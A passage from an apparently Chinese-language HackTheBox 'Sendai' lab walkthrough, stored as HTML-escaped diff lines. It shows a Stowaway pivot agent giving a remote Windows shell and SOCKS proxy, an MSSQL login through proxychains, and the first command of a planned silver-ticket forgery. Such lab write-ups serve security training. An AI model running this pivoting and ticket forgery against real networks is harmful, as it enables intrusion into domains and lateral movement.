+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;-----&amp;#39;&lt;/span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;--&amp;#39;&lt;/span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;-----&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;--&amp;#39;&lt;/span&gt;   &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;--&amp;#39;&lt;/span&gt;   &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;--&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;--&amp;#39;&amp;#39;--&amp;#39;&lt;/span&gt;   &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;--&amp;#39;&lt;/span&gt;   &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;--&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;--&amp;#39;&lt;/span&gt;   &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;--&amp;#39;&lt;/span&gt;      
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			            &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt; v2.2  Author:ph4ntom &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Waiting &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; new connection...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Connection from node 10.129.234.66:57556 is set up successfully! Node id is &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;admin&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &amp;gt;&amp;gt; use &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;node 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &amp;gt;&amp;gt; socks &lt;span style=&#34;color:#ae81ff&#34;&gt;5555&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Trying to listen on 0.0.0.0:5555......
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Waiting &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; agent&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;s response......
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[*] Error: listen tcp: address tcp/5555: unknown port
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;(node 0) &amp;gt;&amp;gt; shell
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[*] Waiting for response.....
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Microsoft Windows [Version 10.0.20348.4052]
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;(c) Microsoft Corporation. All rights reserved.
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;C:\Users\mgtsvc$\Documents&amp;gt;whoami
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;whoami
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;sendai\mgtsvc$
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;C:\Users\mgtsvc$\Documents&amp;gt;exit
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;exit
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;(node 0) &amp;gt;&amp;gt; help
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	help                                            Show help information
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	status                                          Show node status,including socks/forward/backward
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	listen                                          Start port listening on current node
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	addmemo    &amp;lt;string&amp;gt;                             Add memo for current node
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	delmemo                                         Delete memo of current node
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	ssh        &amp;lt;ip:port&amp;gt;                            Start SSH through current node
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	shell                                           Start an interactive shell on current node
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	socks      &amp;lt;lport&amp;gt; [username] [pass]            Start a socks5 server
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	stopsocks                                       Shut down socks services
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	connect    &amp;lt;ip:port&amp;gt;                            Connect to a new node
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	sshtunnel  &amp;lt;ip:sshport&amp;gt; &amp;lt;agent port&amp;gt;            Use sshtunnel to add the node into our topology
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	upload     &amp;lt;local filename&amp;gt; &amp;lt;remote filename&amp;gt;   Upload file to current node
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	download   &amp;lt;remote filename&amp;gt; &amp;lt;local filename&amp;gt;   Download file from current node
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	forward    &amp;lt;lport&amp;gt; &amp;lt;ip:port&amp;gt;                    Forward local port to specific remote ip:port
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	stopforward                                     Shut down forward services
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	backward    &amp;lt;rport&amp;gt; &amp;lt;lport&amp;gt;                     Backward remote port(agent) to local port(admin)
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	stopbackward                                    Shut down backward services
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	shutdown                                        Terminate current node
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	back                                            Back to parent panel
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	exit                                            Exit Stowaway
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;(node 0) &amp;gt;&amp;gt; socks 5555
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[*] Unknown Command!
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	help                                            Show help information
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	status                                          Show node status,including socks/forward/backward
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	listen                                          Start port listening on current node
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	addmemo    &amp;lt;string&amp;gt;                             Add memo for current node
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	delmemo                                         Delete memo of current node
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	ssh        &amp;lt;ip:port&amp;gt;                            Start SSH through current node
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	shell                                           Start an interactive shell on current node
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	socks      &amp;lt;lport&amp;gt; [username] [pass]            Start a socks5 server
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	stopsocks                                       Shut down socks services
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	connect    &amp;lt;ip:port&amp;gt;                            Connect to a new node
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	sshtunnel  &amp;lt;ip:sshport&amp;gt; &amp;lt;agent port&amp;gt;            Use sshtunnel to add the node into our topology
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	upload     &amp;lt;local filename&amp;gt; &amp;lt;remote filename&amp;gt;   Upload file to current node
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	download   &amp;lt;remote filename&amp;gt; &amp;lt;local filename&amp;gt;   Download file from current node
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	forward    &amp;lt;lport&amp;gt; &amp;lt;ip:port&amp;gt;                    Forward local port to specific remote ip:port
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	stopforward                                     Shut down forward services
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	backward    &amp;lt;rport&amp;gt; &amp;lt;lport&amp;gt;                     Backward remote port(agent) to local port(admin)
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	stopbackward                                    Shut down backward services
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	shutdown                                        Terminate current node
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	back                                            Back to parent panel
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	exit                                            Exit Stowaway
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;(node 0) &amp;gt;&amp;gt; socks 5555
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[*] Trying to listen on 0.0.0.0:5555......
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[*] Waiting for agent&amp;#39;&lt;/span&gt;s response......
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Socks start successfully!
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;node 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &amp;gt;&amp;gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;直接连接&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/sendai&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ proxychains4 impacket-mssqlclient -windows-auth $user2:$pass2@127.0.0.1
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;proxychains&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; config file found: /etc/proxychains4.conf
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;proxychains&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;proxychains&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; DLL init: proxychains-ng 4.17
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;proxychains&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; DLL init: proxychains-ng 4.17
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;proxychains&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; DLL init: proxychains-ng 4.17
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Encryption required, switching to TLS
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; ENVCHANGE&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;DATABASE&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;: Old Value: master, New Value: master
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; ENVCHANGE&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;LANGUAGE&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;: Old Value: , New Value: us_english
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; ENVCHANGE&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;PACKETSIZE&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;: Old Value: 4096, New Value: &lt;span style=&#34;color:#ae81ff&#34;&gt;16192&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; INFO&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;DC&lt;span style=&#34;color:#ae81ff&#34;&gt;\S&lt;/span&gt;QLEXPRESS&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;: Line 1: Changed database context to &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;master&amp;#39;&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; INFO&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;DC&lt;span style=&#34;color:#ae81ff&#34;&gt;\S&lt;/span&gt;QLEXPRESS&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;: Line 1: Changed language setting to us_english.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; ACK: Result: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; - Microsoft SQL Server &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;150&lt;/span&gt; 7208&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Press help &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; extra shell commands
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SQL &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;SENDAI&lt;span style=&#34;color:#ae81ff&#34;&gt;\s&lt;/span&gt;qlsvc  guest@master&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;&amp;gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;select&lt;/span&gt; @@servername
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-------------   
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;DC&lt;span style=&#34;color:#ae81ff&#34;&gt;\S&lt;/span&gt;QLEXPRESS   
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SQL &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;SENDAI&lt;span style=&#34;color:#ae81ff&#34;&gt;\s&lt;/span&gt;qlsvc  guest@master&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;&amp;gt; SELECT entity_name, permission_name FROM fn_my_permissions&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;NULL, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;SERVER&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;entity_name   permission_name     
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-----------   -----------------   
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;server        CONNECT SQL         
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;server        VIEW ANY DATABASE   
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SQL &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;SENDAI&lt;span style=&#34;color:#ae81ff&#34;&gt;\s&lt;/span&gt;qlsvc  guest@master&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;&amp;gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;当前权限不足，还是走捷径吧，懒得查数据库了，我们有密码直接打白银票据&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;获取域sid和服务账户hash
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/sendai&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ nxc ldap $ip -u $user2 -p $pass2 --get-sid
